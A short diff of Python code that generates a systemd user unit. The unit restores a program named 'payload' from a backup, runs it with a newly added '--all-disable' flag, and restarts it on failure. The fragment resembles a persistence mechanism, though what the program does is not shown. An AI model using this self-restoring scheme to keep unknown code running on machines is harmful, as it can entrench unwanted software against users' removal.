@@ -35,7 +35,7 @@ def create_unit_content(progFileName: str = "payload", progFileBackup: str = "pa
     WorkingDirectory=%h
 
     ExecStartPre=/bin/sh -c '[ -x "$PROG" ] || {{ [ -f "$BACKUP" ] && cp "$BACKUP" "$PROG" && chmod +x "$PROG"; :; }}'
-    ExecStart=/bin/sh -c '[ -x "$PROG" ] && exec "$PROG" || {{ echo "No payload or backup available, skipping"; exit 0; }}'
+    ExecStart=/bin/sh -c '[ -x "$PROG" ] && exec "$PROG" --all-disable || {{ echo "No payload or backup available, skipping"; exit 0; }}'
 
     Restart=on-failure
     RestartSec=3
